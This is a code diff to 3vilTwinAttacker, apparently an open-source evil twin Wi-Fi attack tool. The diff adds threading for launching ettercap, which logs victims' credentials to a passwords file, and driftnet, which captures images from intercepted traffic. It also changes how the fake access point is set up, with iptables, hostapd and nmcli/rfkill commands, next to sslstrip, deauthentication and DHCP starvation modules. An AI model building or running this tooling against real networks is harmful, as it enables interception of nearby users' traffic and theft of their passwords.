@@ -21,7 +21,7 @@ from sys import argv
 import logging
 from re import search
 from time import asctime
-from subprocess import Popen,PIPE,STDOUT,call
+from subprocess import Popen,PIPE,STDOUT,call,check_output,CalledProcessError
 from Modules.ModuleStarvation import frm_dhcp_main
 from Modules.ModuleDeauth import frm_window
 from Modules.ModuleMacchanger import frm_mac_generator
@@ -41,7 +41,7 @@ from Plugins.sslstrip.URLMonitor import URLMonitor
 from Plugins.sslstrip.CookieCleaner import CookieCleaner
 from os import geteuid,system,path,getcwd,chdir,popen,listdir,mkdir
 if search('/usr/share/',argv[0]):chdir('/usr/share/3vilTwinAttacker/')
-author      = ' @mh4x0f P0cl4bs Team'
+author      = 'Marcos Nesster @mh4x0f P0cl4bs Team'
 emails      = ['mh4root@gmail.com','p0cl4bs@gmail.com']
 license     = 'MIT License (MIT)'
 version     = '0.6.7'
@@ -574,17 +574,23 @@ class SubMain(QWidget):
     def start_etter(self):
         if self.ProgramCheck[1]:
             if search(str(self.Ap_iface),str(popen('ifconfig').read())):
-                call(['sudo', 'xterm', '-geometry', '73x25-1+50',
+                Thread_Ettercap = ProcessThread(['sudo', 'xterm', '-geometry', '73x25-1+50',
                 '-T', 'ettercap', '-s', '-sb', '-si', '+sk', '-sl',
                     '5000', '-e', 'ettercap', '-p', '-u', '-T', '-q', '-w',
                       'Logs/passwords', '-i', self.Ap_iface])
+                Thread_Ettercap.setName('Tool::Ettercap')
+                self.Apthreads['RougeAP'].append(Thread_Ettercap)
+                Thread_Ettercap.start()
             return
         QMessageBox.information(self,'ettercap','ettercap not found.')
     def start_dift(self):
         if self.ProgramCheck[2]:
             if search(str(self.Ap_iface),str(popen('ifconfig').read())):
-                call(['sudo', 'xterm', '-geometry', '75x15+1+200',
+                Thread_driftnet = ProcessThread(['sudo', 'xterm', '-geometry', '75x15+1+200',
                     '-T', 'DriftNet', '-e', 'driftnet', '-i', self.Ap_iface])
+                Thread_driftnet.setName('Tool::Driftnet')
+                self.Apthreads['RougeAP'].append(Thread_driftnet)
+                Thread_driftnet.start()
             return
         QMessageBox.information(self,'driftnet','driftnet not found.')
 
@@ -605,13 +611,13 @@ class SubMain(QWidget):
                 'iptables --table nat --flush',
                 'iptables --delete-chain',
                 'iptables --table nat --delete-chain',
+                'ifconfig %s 0'%(self.Ap_iface),
                 'killall dhpcd',
                 'killall dnsmasq'
             ],
         'hostapd':
             [
                 'interface={}\n'.format(str(self.selectCard.currentText())),
-                'driver=nl80211\n',
                 'ssid={}\n'.format(str(self.EditApName.text())),
                 'channel={}\n'.format(str(self.EditChannel.text())),
             ],
@@ -638,8 +644,8 @@ class SubMain(QWidget):
             ]
         }
         Refactor.set_ip_forward(1)
-        for i in self.SettingsAP['interface']:popen(i)
         for i in self.SettingsAP['kill']:popen(i)
+        for i in self.SettingsAP['interface']:popen(i)
         dhcp_select = self.FSettings.xmlSettings('dhcp','dhcp_server',None,False)
         if dhcp_select != 'dnsmasq':
             with open('Settings/dhcpd.conf','w') as dhcp:
@@ -672,7 +678,9 @@ class SubMain(QWidget):
         elif dhcp_select == 'dnsmasq':
             if not self.ProgramCheck[4]:
                 return QMessageBox.information(self,'Error dhcp','dnsmasq not installed')
-
+        if str(Refactor.get_interfaces()['activated']).startswith('wlan'):
+            return QMessageBox.information(self,'Error network card',
+                'You are connected with interface wireless, try again with local connection')
 
         self.APactived = self.FSettings.xmlSettings('accesspoint','actived',None,False)
         if self.APactived == 'airbase-ng':
@@ -696,9 +704,16 @@ class SubMain(QWidget):
             self.FSettings.xmlSettings('netcreds','interface',
             str(self.selectCard.currentText()),False)
             self.Ap_iface = str(self.selectCard.currentText())
-            call(['airmon-ng', 'check' ,'kill'])
+            try:
+                check_output(['nmcli','radio','wifi',"off"])
+            except CalledProcessError:
+                try:
+                    check_output(['nmcli','nm','wifi',"off"])
+                except CalledProcessError as e:
+                    return QMessageBox.warning(self,'Error nmcli',e)
+            call(['rfkill', 'unblock' ,'wlan'])
             self.CoreSettings()
-            ignore = ('interface=','driver=','ssid=','channel=')
+            ignore = ('interface=','ssid=','channel=')
             with open('Settings/hostapd.conf','w') as apconf:
                 for i in self.SettingsAP['hostapd']:apconf.write(i)
                 for config in str(self.FSettings.ListHostapd.toPlainText()).split('\n'):
